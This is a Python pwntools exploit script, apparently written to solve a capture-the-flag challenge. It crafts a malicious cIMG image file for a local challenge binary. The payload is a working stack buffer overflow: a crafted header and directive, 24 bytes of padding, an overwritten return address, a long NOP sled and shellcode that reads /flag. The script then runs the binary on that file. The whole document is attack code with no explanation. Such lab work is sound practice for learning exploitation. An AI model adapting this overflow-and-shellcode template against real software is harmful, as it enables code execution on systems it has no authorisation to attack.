import struct
import sys

from Crypto.Util.Padding import pad
from pwn import *
from pwn import asm, context, process

context.update(arch="amd64", os="linux")
context.log_level = "info"

OFFSET = 24
BUFFER_ADDR = 0x7FFFFFFFEC90
DIRECTIVE = 1337

# TODO
def build_cimg_header():
    magic = b"cIMG"
    version = 4
    width = 1
    height = 1
    directive_count = 1

    return struct.pack("<4sHBBI", magic, version, width, height, directive_count)


def main():
    binary_path = "/challenge/integration-cimg-screenshot-sc"
    filename = "payload.cimg"
    shellcode = asm(shellcraft.cat("/flag"))

    payload = build_cimg_header()

    payload += struct.pack("<H", DIRECTIVE)

    padding = b"\x90" * OFFSET

    nop_sled = b"\x90" * 2000

    payload += padding + p64(BUFFER_ADDR + OFFSET + 8) + nop_sled + shellcode

    with open(filename, "wb") as f:
        f.write(payload)

    p = process([binary_path, filename], env={})
    print(p.recvall().decode(errors="ignore"))


if __name__ == "__main__":
    main()
